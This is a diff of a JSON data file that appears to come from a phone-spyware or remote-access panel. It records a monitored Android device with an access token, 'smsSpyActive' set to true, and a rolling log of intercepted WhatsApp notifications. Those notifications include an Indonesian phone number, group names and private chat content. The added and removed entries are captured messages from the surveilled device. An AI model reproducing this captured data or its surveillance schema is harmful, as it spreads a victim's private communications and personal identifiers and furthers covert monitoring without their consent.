@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777177949714,
+    "lastSeen": 1777177952656,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (58 pesan): ~ wanglin",
+        "content": "Halo @⁨+62 858-8287-1385⁩ Selamat Datang di Grup 7Sex Message",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177955248
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎69 pesan dari 2 chat",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177952204
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (11 pesan): ~ Zal Яyuichi",
+        "content": "📷 `❀ SELECT BRAT TYPE ❀`\n- Text: intannn\n- Creator: ẉ.ceo/Zal7Seχ\n\n> select brat type you want to create",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177952158
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (10 pesan): ~ 사랑 ᥊ᥲbιruu.ʙᴏᴛ",
+        "content": "💟 Stiker",
+        "time": "26/04 12:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777177950962
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3987,38 +4019,6 @@
         "time": "26/04 11:23",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173179628
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (172 pesan): ~ 黒羽_",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173179378
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟏  || 𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (95 pesan): ~ Hudzz Sturee",
-        "content": "📷 op?30+ gb+sl angkut sumua mc/direct bebas",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173179236
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1143 pesan dari 19 chat",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173177398
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (48 pesan): ~ qɪs†",
-        "content": "gsh yg udh intro mah",
-        "time": "26/04 11:23",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173177380
       }
     ],
     "galleryPhotos": [],
